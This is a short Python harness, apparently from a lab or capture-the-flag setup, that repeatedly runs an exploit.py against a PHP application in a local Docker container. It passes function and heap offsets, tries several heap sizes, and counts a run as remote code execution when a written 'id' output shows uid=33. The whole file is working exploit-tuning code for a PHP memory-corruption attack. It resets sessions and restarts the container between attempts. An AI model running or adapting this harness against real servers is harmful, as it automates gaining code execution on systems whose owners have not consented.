import subprocess, sys, time
BASE = r"C:\Users\likat\p2s52704"
c, port, zif, dtor = "p2s8335", "18112", "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def clean():
    sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
    sh(f'docker restart {c}')
    time.sleep(3.0)

def run(huge_mb, htdata_off="0x690d8"):
    clean()
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--htdata-offset", htdata_off,
           "--huge-mb", str(huge_mb),
           "--retries", "2",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=200)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    ok = "uid=33" in out
    stage = "stage1"
    if "stage 2" in out: stage = "stage2"
    if "stage 3" in out: stage = "stage3"
    return ok, stage, out

for mb in [9, 10, 11, 12, 14]:
    ok, stage, out = run(mb)
    print(f"huge-mb={mb}: {'RCE' if ok else 'no'} (reached {stage})", flush=True)
    if ok:
        print("  proof:", sh(f'docker exec {c} cat /www/p1').stdout.strip()[:50])
        break
